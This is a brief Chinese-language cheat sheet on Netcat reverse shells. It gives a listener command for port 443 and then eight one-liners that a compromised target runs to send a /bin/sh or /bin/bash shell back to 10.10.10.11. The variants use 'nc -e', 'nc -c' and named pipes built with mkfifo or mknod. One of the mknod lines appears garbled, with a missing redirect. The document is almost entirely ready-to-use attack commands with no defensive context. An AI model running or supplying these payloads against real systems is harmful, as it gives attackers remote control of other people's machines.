# Netcat反弹shell

首先在本地监听TCP协议443端口

```
nc -lvp 443

```

然后在靶机上执行如下命令：

```bash
nc -e /bin/sh 10.10.10.11 443

```

```bash
nc -e /bin/bash 10.10.10.11 443

```

```bash
nc -c bash 10.10.10.11 443

```

```bash
mknod backpipe p && nc 10.10.10.11 443 0<backpipe | /bin/bash 1>backpipe 

```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.11 443 >/tmp/f

```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.11 443 0/tmp/p 2>&1

```

```bash
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.10.11 443 > f

```

```bash
rm -f x; mknod x p && nc 10.10.10.11 443 0<x | /bin/bash 1>x

```

